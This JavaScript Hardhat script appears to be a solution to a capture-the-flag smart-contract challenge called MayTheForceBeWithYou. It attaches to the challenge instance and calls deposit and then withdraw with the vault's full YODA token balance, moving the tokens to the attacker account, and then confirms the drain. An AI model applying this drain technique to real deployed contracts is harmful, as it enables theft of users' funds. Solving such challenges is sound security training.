const hre = require("hardhat");
const { expect } = require("chai");

async function main() {
  const provider = new ethers.providers.Web3Provider(network.provider);

  const [deployer] = await ethers.getSigners();
  console.log("[*] attacker address:", deployer.address);
  console.log("[*] attacker balance:", (await deployer.getBalance()).toString());

  const instanceAddress = process.env.INSTANCE_ADDRESS;
  console.log("[*] instance address:", instanceAddress);

  const MayTheForceBeWithYou = await hre.ethers.getContractFactory("MayTheForceBeWithYou");
  const xyoda = await MayTheForceBeWithYou.attach(instanceAddress);

  const yodaAddress = await xyoda.yoda();
  console.log("[*] YODA address:", yodaAddress)


  const MiniMeToken = await hre.ethers.getContractFactory("MiniMeToken");
  const yoda = await MiniMeToken.attach(yodaAddress);

  let totalBalance = (await yoda.balanceOf(instanceAddress));

  console.log("[*] balance of MayTheForceBeWithYou (in YODA):", totalBalance.toString());
  console.log("[*] balance of attacker (in YODA):", (await yoda.balanceOf(deployer.address)).toString());

  console.log("[*] exploiting...");

  let tx = await xyoda.deposit(totalBalance);
  await tx.wait();

  tx = await xyoda.withdraw(totalBalance);
  await tx.wait();

  console.log("[*] finished!")

  let balanceForce = (await yoda.balanceOf(instanceAddress));
  let balanceAttacker = (await yoda.balanceOf(deployer.address));

  console.log("[*] balance of MayTheForceBeWithYou (in YODA):", balanceForce.toString());
  console.log("[*] balance of attacker (in YODA):", balanceAttacker.toString());

  if(balanceForce.eq(0) && balanceAttacker.eq(totalBalance)) {
    console.log("[+] exploit completed successfully!");
  } else {
    console.log("[-] exploit failed")
  }

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
